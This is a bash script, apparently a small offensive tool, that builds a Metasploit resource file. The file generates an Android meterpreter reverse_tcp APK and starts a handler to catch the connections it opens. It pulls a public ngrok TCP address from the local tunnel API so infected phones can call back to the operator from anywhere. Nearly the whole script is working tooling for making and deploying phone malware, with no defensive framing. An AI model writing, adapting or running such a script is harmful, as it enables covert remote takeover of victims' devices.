#!/usr/bin/env bash

#while getopts lh:lp:ra:rp: args
#do
#	case "${args}" in
#		lh) lhost=${OPTARGS};;
#		lp) lport=${OPTARGS};;
#		ra) revadd=${OPTARGS};;
#		rp) revport=${OPTARGS};;
#	esac
#done
#
green=$(tput setaf 2)
red=$(tput setaf 1)
blue=$(tput setaf 3)
banner(){
        echo -e "███╗░░░███╗░██████╗███████╗██████╗░░█████╗░" | lolcat
	echo -e "████╗░████║██╔════╝██╔════╝██╔══██╗██╔══██╗" | lolcat
	echo -e "██╔████╔██║╚█████╗░█████╗░░██████╔╝██║░░╚═╝" | lolcat
	echo -e "██║╚██╔╝██║░╚═══██╗██╔══╝░░██╔══██╗██║░░██╗" | lolcat
	echo -e "██║░╚═╝░██║██████╔╝██║░░░░░██║░░██║╚█████╔╝" | lolcat
	echo -e "╚═╝░░░░░╚═╝╚═════╝░╚═╝░░░░░╚═╝░░╚═╝░╚════╝░" | lolcat
	echo -e "Author: Freddy Phoenix Mills" | lolcat
	echo -e "E-Mail: phoenixgibson007@gmail.com" | lolcat
	echo -e "E-Mail2: phoenixgibson007@proton.me" | lolcat
}

createrc(){
	link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o [0-9]\\.tcp\\.eu\\.ngrok\\.io:[0-9][0-9][0-9][0-9][0-9])
	echo "Your Ngrok link is: $green $link"
	rm -rf resource.rc && touch resource.rc
	created=resource.rc
	lhost=""
	lport=""
	revhost=""
	revport=""
#	apkname="generated.apk"
	read -p "$green lhostIP/Hostname: " lhost
	read -p "$green localport: " lport
	read -p "$green ReverseListenerBindAddress: " revhost
	read -p "$green ReverseListenerbindport: " revport
	#read -p "$green Output Apk Name: " name
	echo -e "$green [*] output apk is $blue generated.apk"
	echo -e "$blue you can rename it to whatever"
	echo "use payload/android/meterpreter/reverse_tcp" >> $created
	echo "set lhost $lhost"  >> $created 
	echo "set lport $lport" >>$created
	echo "set reverselistenerbindaddress $revhost" >>$created
	echo "set reverselistenerbindport $revport" >> $created
	echo "generate -f raw -o generated.apk" >> $created
	echo "use exploit/multi/handler" >> $created
	echo "set payload android/meterpreter/reverse_tcp" >> $created
	echo "set lhost $lhost"  >> $created
        echo "set lport $lport" >>$created
        echo "set reverselistenerbindaddress $revhost" >>$created
        echo "set reverselistenerbindport $revport" >> $created
	echo "exploit -j" >> $created
}
banner
createrc
